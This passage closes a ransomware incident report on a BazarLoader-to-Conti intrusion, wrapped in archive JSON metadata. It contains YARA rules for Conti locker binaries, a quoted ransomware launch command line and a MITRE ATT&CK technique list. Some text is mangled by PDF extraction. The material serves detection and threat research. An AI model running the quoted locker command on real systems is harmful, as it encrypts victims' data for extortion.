\"\\\\kprocesshacker.sys\" fullword wide\n   $s18 = \"\\\\SystemRoot\\\\system32\\\\drivers\\\\ntfs.sys\" fullword wide\n   $s19 = \"[email protected]\" fullword ascii\n   $s20 = \"[email protected]\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 4000KB and\n   1 of ($x*) and 4 of them\n}\nrule unlocker {\n  meta:\n   description = \"mal - file unlocker.exe\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n   hash1 = \"09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53\"\n  strings:\n   $s1 = \"For more detailed information, please visit\nhttp://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline\" fullword wide\n   $s2 = \"(Symantec SHA256 TimeStamping Signer - G20\" fullword ascii\n   $s3 = \"      <requestedExecutionLevel level=\\\"asInvoker\\\"      \nuiAccess=\\\"false\\\"/>\" fullword ascii\n   $s4 = \"(Symantec SHA256 TimeStamping Signer - G2\" fullword ascii\n   $s5 = \"Causes Setup to create a log file in the user's TEMP directory.\"\nfullword wide\n   $s6 = \"Prevents the user from cancelling during the installation process.\"\nfullword wide\n   $s7 = \"Same as /LOG, except it allows you to specify a fixed path/filename to\nuse for the log file.\" fullword wide\n   $s8 = \"    <dpiAware\nxmlns=\\\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\\\">true</dpiAware>\"\nfullword ascii\n   $s9 = \"The Setup program accepts optional command line parameters.\" fullword\nwide\n   $s10 = \"Instructs Setup to load the settings from the specified file after\nhaving checked the command line.\" fullword wide\n\n```\n\n-----\n\n```\n   $s11 Overrides the default component settings. fullword wide\n   $s12 = \"/MERGETASKS=\\\"comma separated list of task names\\\"\" fullword wide\n   $s13 = \"/PASSWORD=password\" fullword wide\n   $s14 = \"Specifies the password to use.\" fullword wide\n   $s15 = \"yyyyvvvvvvvvvxxw\" fullword ascii\n   $s16 = \"yyyyyyrrrsy\" fullword ascii\n   $s17 = \"      processorArchitecture=\\\"x86\\\"\" fullword ascii\n   $s18 = \"  processorArchitecture=\\\"x86\\\"\" fullword ascii\n   $s19 = \"Prevents Setup from restarting the system following a successful\ninstallation, or after a Preparing to Install failure that requ\" wide\n   $s20 = \"/DIR=\\\"x:\\\\dirname\\\"\" fullword wide\n  condition:\n   uint16(0) == 0x5a4d and filesize < 7000KB and\n   8 of them\n}\nrule mal_host2_locker {\n  meta:\n   description = \"mal - file locker.bat\"\n   author = \"TheDFIRReport\"\n   date = \"2021-11-29\"\n   hash1 = \"1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3\"\n  strings:\n   $x1 = \"_locker.exe -m -net -size 10 -nomutex -p\" ascii\n  condition:\n   uint16(0) == 0x7473 and filesize < 8KB and\n   $x1\n}\nimport \"pe\"\nrule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker {\n  meta:\n   description = \"conti - file\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-29\"\n   hash1 = \"9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219\"\n  strings:\n   $s1 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n   $s2 = \"operator co_await\" fullword ascii\n   $s3 = \">*>6>A>_>\" fullword ascii /* hex encoded string 'j' */\n   $s4 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n   $s5 = \"Bapi-ms-win-core-fibers-l1-1-1\" fullword wide\n   $s6 = \"SVWjEhQ\" fullword ascii\n   $s7 = \";F;[;l;\" fullword ascii /* Goodware String - occured 1 times */\n   $s8 = \"[email protected]\\\\7p7\" fullword ascii /* Goodware String - occured 1\ntimes */\n   $s9 = \"6#606B6\" fullword ascii /* Goodware String - occured 1 times */\n   $s10 = \"<!=X=u=\" fullword ascii /* Goodware String - occured 1 times */\n   $s11 = \"expand 32-byte k\" fullword ascii /* Goodware String - occured 1 times\n*/\n   $s12 = \"6!7?7J7\" fullword ascii /* Goodware String - occured 2 times */\n   $s13 = \"delete\" fullword ascii /* Goodware String - occured 2789 times */\n\n```\n\n-----\n\n```\n   $s14 4!4(4/464 4D4K4R4Z4b4j4v4 fullword ascii / Goodware String occured\n3 times */\n   $s15 = \".CRT$XIAC\" fullword ascii /* Goodware String - occured 3 times */\n   $s16 = \"0#0)01060\\\\0a0\" fullword ascii\n   $s17 = \";\\\";/;=;K;V;l;\" fullword ascii\n   $s18 = \"6,606P6X6\\\\6x6\" fullword ascii\n   $s19 = \"6(6,[email protected]\\\\6`6d6p6t6x6|6\" fullword ascii\n   $s20 = \"8 :M:}:\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 600KB and\n   ( pe.imphash() == \"50472e0ba953856d228c7483b149ea72\" or all of them )\n}\nrule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86 {\n  meta:\n   description = \"conti - file\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x86.dll\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-29\"\n   hash1 = \"01a9549c015cfcbff4a830cea7df6386dc5474fd433f15a6944b834551a2b4c9\"\n  strings:\n   $s1 = \"conti_v3.dll\" fullword ascii\n   $s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n   $s3 = \"6 7/787E7[7\" fullword ascii /* hex encoded string 'gx~w' */\n   $s4 = \"operator co_await\" fullword ascii\n   $s5 = \"2%3.3f3~3\" fullword ascii /* hex encoded string '#?3' */\n   $s6 = \"1\\\"1&1,:4:<:D:L:T:\\\\:d:l:t:|:\" fullword ascii $s7 = \"api-ms-winappmodel-runtime-l1-1-2\" fullword wide $s8 = \"SVWjEhQ\" fullword ascii $s9 =\n\"__swift_2\" fullword ascii $s10 = \"__swift_1\" fullword ascii $s11 = \"api-ms-win-corefile-l1-2-2\" fullword wide /* Goodware String - occured 1 times */ $s12 =\n\"7K7P7T7X7\\\\7\" fullword ascii /* Goodware String - occured 1 times */ $s13 =\n\"7h7o7v7}7\" fullword ascii /* Goodware String - occured 1 times */ $s14 = \"O0a0s0\"\nfullword ascii /* Goodware String - occured 1 times */ $s15 = \";?;I;S;\" fullword\nascii /* Goodware String - occured 1 times */ $s16 = \"8>8C8Q8V8\" fullword ascii /*\nGoodware String - occured 1 times */\n   $s17 = \"[email protected]\" fullword ascii\n   $s18 = \"5-5X5s5\" fullword ascii /* Goodware String - occured 1 times */\n   $s19 = \"expand 32-byte k\" fullword ascii /* Goodware String - occured 1 times\n*/\n   $s20 = \"delete\" fullword ascii /* Goodware String - occured 2789 times */\n  condition:\n   uint16(0) == 0x5a4d and filesize < 600KB and\n   ( pe.imphash() == \"749dc5143e9fc01aa1d221fb9a48d5ea\" or all of them )\n}\nrule o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64 {\n  meta:\n   description = \"conti - file\no4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker_x64.dll\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-11-29\"\n   hash1 = \"31656dcea4da01879e80dff59a1af60ca09c951fe5fc7e291be611c4eadd932a\"\n  strings:\n\n```\n\n-----\n\n```\n   $s1 conti_v3.dll fullword ascii\n   $s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n   $s3 = \"operator co_await\" fullword ascii\n   $s4 = \"api-ms-win-appmodel-runtime-l1-1-2\" fullword wide\n   $s5 = \"api-ms-win-core-file-l1-2-2\" fullword wide /* Goodware String - occured\n1 times */\n   $s6 = \"__swift_2\" fullword ascii\n   $s7 = \"__swift_1\" fullword ascii\n   $s8 = \"expand 32-byte k\" fullword ascii /* Goodware String - occured 1 times */\n   $s9 = \"u3HcH<H\" fullword ascii /* Goodware String - occured 2 times */\n   $s10 = \"D$XD9x\" fullword ascii /* Goodware String - occured 2 times */\n   $s11 = \"delete\" fullword ascii /* Goodware String - occured 2789 times */\n   $s12 = \"ue!T$(H!T$ \" fullword ascii\n   $s13 = \"L$&8\\\\$&t,8Y\" fullword ascii\n   $s14 = \"F 2-by\" fullword ascii\n   $s15 = \"u\\\"8Z(t\" fullword ascii\n   $s16 = \"L$ |+L;\" fullword ascii\n   $s17 = \"vB8_(t\" fullword ascii\n   $s18 = \"ext-ms-\" fullword wide\n   $s19 = \"OOxq*H\" fullword ascii\n   $s20 = \"H97u+A\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 600KB and\n   ( pe.imphash() == \"137fa89046164fe07e0dd776ed7a0191\" or all of them )\n}\n\n### MITRE\nT1218.010 - Signed Binary Proxy Execution: Regsvr32\nT1218.005 - Signed Binary Proxy Execution: Mshta\nT1218.011 - Signed Binary Proxy Execution: Rundll32\nT1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage\nT1105 - Ingress Tool Transfer\nT1059.005 - Command and Scripting Interpreter: Visual Basic\nT1059.007 - Command and Scripting Interpreter: JavaScript\nT1059.001 - Command and Scripting Interpreter: PowerShell\nT1055 - Process Injection\nT1486 - Data Encrypted for Impact\nT1482 - Domain Trust Discovery\nT1047 - Windows Management Instrumentation\nT1021.002 - Remote Services: SMB/Windows Admin Shares\nT1124 - System Time Discovery\nT1021.001 - Remote Services: Remote Desktop Protocol\nT1566.001 - Phishing: Spearphishing Attachment\nT1087.002 - Account Discovery: Domain Account\nT1087.001 - Account Discovery: Local Account\nT1057 - Process Discovery\nT1083 - File and Directory Discovery\nT1590.005 - Gather Victim Network Information: IP Addresses\n\n MITRE Software\n\n```\n\n-----\n\n```\nNet S0039\nNltest – S0359\nCmd – S0106\nTasklist – S0057\nCobalt Strike – S0154\nAdFind - S0552\n\n### Reference\n\n#### Detecting Rclone – An Effective Tool for Exfiltration, NCC Group – https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for- exfiltration/ Rundll32, Red Canary – https://redcanary.com/threat-detection- report/techniques/rundll32/ TA551 (Shathak) continues pushing BazarLoader, infections lead to Cobalt Strike, SANS ISC – https://isc.sans.edu/forums/diary/TA551+Shathak+continues+pushing+BazarLoader+inf ections+lead+to+Cobalt+Strike/27738/ Invoke-ShareFinder, GitHub [Veil PowerView] – https://github.com/darkoperator/Veil- PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1 taskmgr.exe slashing numbers, Hexicorn – https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/\n\n Internal case #5794\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-29 - CONTInuing the Bazar Ransomware Story.pdf"
    ],
    "report_names": [
        "2021-11-29 - CONTInuing the Bazar Ransomware Story.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536000,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1653761073,
    "ts_modification_date": 1653761073,
    "files": {
        "pdf": "https://archive.orkl.eu/8dbc05f125900d732bab37945c769a76760357f5.pdf",
        "text": "https://archive.orkl.eu/8dbc05f125900d732bab37945c769a76760357f5.txt",
        "img": "https://archive.orkl.eu/8dbc05f125900d732bab37945c769a76760357f5.jpg"
    }
}